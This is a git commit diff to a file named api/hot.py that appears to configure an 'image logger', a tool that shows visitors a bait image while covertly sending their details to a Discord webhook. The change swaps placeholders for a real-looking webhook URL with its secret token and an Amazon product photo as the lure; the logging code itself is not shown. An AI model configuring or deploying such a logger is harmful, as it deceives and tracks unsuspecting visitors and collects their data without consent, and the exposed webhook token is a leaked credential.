2dfb0d18975e92252894b558e1ee297b4cf9ceb3
PRANITBHORE <94361390+PRANITBHORE@users.noreply.github.com>
2025-01-31 13:50:13 +0530

    Update hot.py

--- api/hot.py
+++ api/hot.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334608952498847805/56odSNVexjQ9Cm_qW8lVDQ5EhzxLHP71WUPqFEE_8VplYYYHL6FqFQqf7f9JOoxTAzWu",
+    "image": "https://m.media-amazon.com/images/I/715tAlRV1oL._SX679_.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
